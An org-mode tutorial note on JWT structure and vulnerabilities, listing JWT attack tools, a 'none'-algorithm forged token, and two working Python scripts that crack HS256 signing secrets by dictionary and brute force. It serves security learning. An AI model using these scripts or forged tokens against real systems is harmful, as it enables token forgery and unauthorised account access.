#+title: Jwt
#+author: gabriel

JWT (JSON Web Token) is a JSON-encoded piece of information typically used for authentication and information exchange. JWTs are secured by digital signatures, ensuring data integrity and authentication.

The primary purpose of JWTs is to facilitate user authentication and authorization. Additionally, it is possible to securely transfer information between various services.

[[./imgs/jwt.png]]

*header* ->
The header specifies the type of token and the signing algorithm used. It usually contains a JSON object like this:
#+begin_src python
{
  "alg": "HS256",
  "typ": "JWT"
}
#+end_src

*payload* ->
 The payload contains the data to be carried inside the token. This data can include information such as user ID and the token's expiration date.
 #+begin_src python
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
 #+end_src

 *signature* ->
 The signature is created by combining and signing the header and payload. The signature helps verify that the JWT has not been tampered with and is trustworthy.

** jwt vs other token formats
JWTs are lighter and easier to use compared to other token formats like SAML (Security Assertion Markup Language) and OAuth. Here are some differences between these formats:
- JWT: Uses JSON format, making it lighter and more readable. Easily transported within HTTP headers and URLs.
- SAML: An XML-based format that is more complex. Used in applications with high security and validation requirements.
- OAuth: An authorization protocol that can be used with JWTs. Commonly used to grant third-party applications access.

  When a JWT is created, the header and payload are defined in JSON format and encoded using base64URL encoding. These two components are then combined and signed using a specified algorithm. The signature is used to verify the integrity and origin of the token.


When a JWT is received, the header and payload are decoded using base64URL encoding, and the signature is verified. This validation confirms that the token has not been tampered with and is trustworthy.

JWTs are widely used in user authentication and authorization processes. When a user logs in, a JWT is created that carries this user's specific authorization information. This token is sent to the server with each request, and the server verifies the token to check the user's permissions.

JWTs are also used to securely share information between different services. For example, in a microservices architecture, one service can securely pass user information to another service via JWT.

* jwt vulns
While JWTs are a powerful tool for secure information exchange and authentication, they can have various security vulnerabilities if misconfigured or weakened security practices are used.

*signature verification flaws* ->
 Failing to properly verify JWT signatures can allow attackers to tamper with the token.

*weak signature keys* ->
 Using weak or easily guessable signature keys can lead to JWTs being easily cracked and altered.

*algorithm confusion* ->
Misconfiguration of algorithm types can be exploited to bypass JWT validation processes.

*kid paramater vulnerabilities* ->
 By injecting the kid parameter and using other techniques, JWT signatures can be bypassed.

*replay attacks* ->
The reusable nature of JWTs allows attackers to use the same token repeatedly.

*token lifetime and validity issues* ->
Tokens with long validity periods increase security risks.

*JWKS spoofing* ->
Bypassing JWT validation using forged keys.

*attacks using jku and x5u headers* ->
 Attacks carried out through external URLs in JWT headers.

* tools
*jwt-tool* ->
jwt_tool is a powerful tool used to analyze, create, and perform various attacks on JWTs. This tool is used to test the weaknesses of JWT and discover security vulnerabilities.
https://github.com/ticarpi/jwt_tool

*jwt-pwn* ->
jwt-pwn is another popular tool used to check JWT signatures, test algorithm confusion, and perform various attacks.
https://github.com/mazen160/jwt-pwn

*jwtXploiter* ->
jwtXploiter is used to manipulate JWTs, bypass signature verification processes, and discover vulnerabilities.
 https://github.com/DontPanicO/jwtXploiter

** signature verification attacks
The signature verification processes of JWTs are crucial for ensuring their security. Signature verification vulnerabilities can compromise the integrity and trustworthiness of JWTs

 These attacks include bypassing signatures using the none algorithm and weak signature verification processes.

** capture of signature keys
 Weak signature keys can lead to JWTs being easily cracked and manipulated. Such attacks involve capturing weak keys through brute force attacks and exploiting misconfigured keys.

** algorithm confusion
Confusion in the algorithm header of JWTs can be used to bypass signature verification processes. Algorithm confusion attacks are carried out by altering the algorithm information in the header part of the JWT.

** kid parameter vulnerabilites
JWT signatures can be bypassed by injecting the kid parameter and using other techniques. These attacks are carried out by exploiting the kid parameter in the JWT header.


JWTs can also be vulnerable to other security issues such as replay attacks, token lifetime, and revocation problems. These attacks can occur when JWTs are reused or valid for long periods. Moreover, JWKS spoofing and attacks using jku/x5u headers fall into this category.

* signature verification attack
The signature of a JWT (JSON Web Token) is a critical component to ensure the integrity and authenticity of the token. However, if misconfigured or if weak security measures are taken, JWT signatures can be manipulated by attackers.

The integrity of JWTs is ensured by combining the header and payload sections and protecting them with a signature. The signature is created using a specific algorithm and is used to verify that the JWT has not been tampered with.

The generated signature is appended to the JWT, forming the final token in header.payload.signature format.

** common algorithms
*HMAC (Hash-based Message Authentication Code)* ->
HMAC is a symmetric algorithm and uses the same secret key (private key) for both signing and verification.

*RSA (Rivest-Shamir-Adleman)* ->
RSA is an asymmetric algorithm and uses different keys for signing and verification. The private key is used for signing, while the public key is used for verification.

** none algorithm attack
One of the simplest attacks encountered in JWT verification processes is the none algorithm attack. In this attack, the signature part of the JWT is completely bypassed.
#+begin_src python
{
  "alg": "none",
  "typ": "JWT"
}
#+end_src

The signature part of the JWT is completely removed, transforming the token into the following format ->
: eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.

* capturing the signature key
Signature keys used to secure JWTs guarantee the integrity and authenticity of the token. However, if these keys are not strong enough or properly protected, attackers can capture them.

Signature keys can be easily guessed by attackers if they are not complex and strong enough. Weak keys generally appear in the following forms:

*simple and short keys* ->
Examples include common passwords like "password," "123456," or "secret."

*personal information* ->
 Keys derived from users' names, birthdates, or other personal information.

*previously compromised keys* ->
 Keys that were leaked in previous security breaches and are reused.

 Attacker can use varous tools and techniques to identift and try exploit weak keys ->

 *dictionary attacks* ->
guessing keys using predefined list of common passwords

 *brute force attacks* ->
 cracking keys by trying all possible combinations

 *rainbow tables* ->
 using precomputed hash values to perform hash comparisons

** dictionary attacks
JWT ->
: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk

Dictionary Create a dictionary file, dictionary.txt, containing common passwords. You can also use password lists available on the internet.

python script for dictionary attack ->
#+begin_src python
import jwt
from jwt.exceptions import InvalidSignatureError

jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
header, payload, signature = jwt_token.split('.')

with open('dictionary.txt', 'r') as file:
    words = file.readlines()

for word in words:
    word = word.strip()
    try:
        decoded = jwt.decode(jwt_token, word, algorithms=['HS256'])
        print(f"Secret found: {word}")
        print(f"Decoded JWT: {decoded}")
        break
    except InvalidSignatureError:
        continue
#+end_src

This code tries every word in the dictionary.txt file as the JWT's signature key. If it finds the correct key, it successfully decodes the JWT and prints out the correct key.

** brute force attacks
Brute force attacks aim to find the correct key by trying all possible combinations of characters. This method can take a significant amount of time, depending on the length and complexity of the key.

JWT ->
: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk

python script for brute force attack ->
#+begin_src python
import jwt
from jwt.exceptions import InvalidSignatureError
import itertools
import string

jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
header, payload, signature = jwt_token.split('.')

charset = string.ascii_lowercase  # 'abcdefghijklmnopqrstuvwxyz'

def brute_force_attack(jwt_token, max_length):
    for length in range(1, max_length + 1):
        for attempt in itertools.product(charset, repeat=length):
            secret = ''.join(attempt)
            try:
                decoded = jwt.decode(jwt_token, secret, algorithms=['HS256'])
                print(f"Secret found: {secret}")
                print(f"Decoded JWT: {decoded}")
                return
            except InvalidSignatureError:
                continue

brute_force_attack(jwt_token, 3)
#+end_src

This code tries all lowercase letter combinations of lengths 1 to 3 to guess the JWT's signature key. If it finds the correct key, it successfully decodes the JWT and prints out the correct key.
